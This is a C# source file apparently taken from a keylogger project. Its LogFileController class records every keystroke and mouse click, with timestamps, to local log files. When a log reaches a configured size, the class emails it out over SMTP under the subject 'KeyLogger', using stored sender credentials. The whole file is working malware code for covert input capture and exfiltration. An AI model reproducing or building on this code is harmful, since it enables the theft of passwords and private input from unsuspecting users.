using System;
using System.IO;

namespace GlobalHooks
{
    class LogFileController
    {
        private const string MouseLogFilePath = @"mouse.log";
        private const string KeyboardLogFilePath = @"keyboard.log";
        private readonly ConfigurationInfo _configuration;
        private readonly SmtpController _smtpController;

        public LogFileController(ConfigurationInfo configuration)
        {
            _configuration = configuration;
            _smtpController = new SmtpController(_configuration);
        }

        public void LogMouseClick(string key, string position)
        {
            using (var writer = new StreamWriter(MouseLogFilePath, true))
            {
                writer.WriteLine($"{DateTime.Now} : Key: {key}, Position: {position}");
            }
            SendLog(MouseLogFilePath);
        }

        public void LogKeyDown(string key)
        {
            using (var writer = new StreamWriter(KeyboardLogFilePath, true))
            {
                writer.WriteLine($"{DateTime.Now} : Key: {key}");
            }
            SendLog(KeyboardLogFilePath);
        }

        private void SendLog(string logFilePath)
        {
            if (string.IsNullOrEmpty(_configuration.To) || string.IsNullOrEmpty(_configuration.From) ||
                string.IsNullOrEmpty(_configuration.Password)) return;
            if(new FileInfo(logFilePath).Length<_configuration.FileSize) return;
            _smtpController.Send(@"KeyLogger", logFilePath);
        }
    }
}
